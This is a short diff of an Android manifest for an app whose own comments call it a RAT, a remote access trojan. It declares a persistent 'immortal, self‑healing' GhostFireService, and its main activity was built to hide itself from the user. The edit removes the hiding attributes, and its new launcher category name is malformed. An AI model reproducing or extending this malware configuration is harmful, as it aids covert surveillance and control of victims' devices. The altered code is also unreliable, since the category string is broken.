@@ -37,16 +37,15 @@
         android:usesCleartextTraffic="true">
 
         <!-- Main activity – appears once, then hides itself -->
-        <activity android:name=".MainActivity"
-            android:excludeFromRecents="true"
-            android:launchMode="singleInstance"
-            android:taskAffinity=""
-            android:noHistory="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
+        <activity 
+    android:name=".MainActivity"
+    android:exported="true">
+    <intent-filter>
+        <action android:name="android.intent.action.MAIN" />
+        <category android:name="android.category.LAUNCHER" />
+    </intent-filter>
+</activity>
+
 
         <!-- The RAT service – immortal, self‑healing -->
         <service android:name=".GhostFireService"
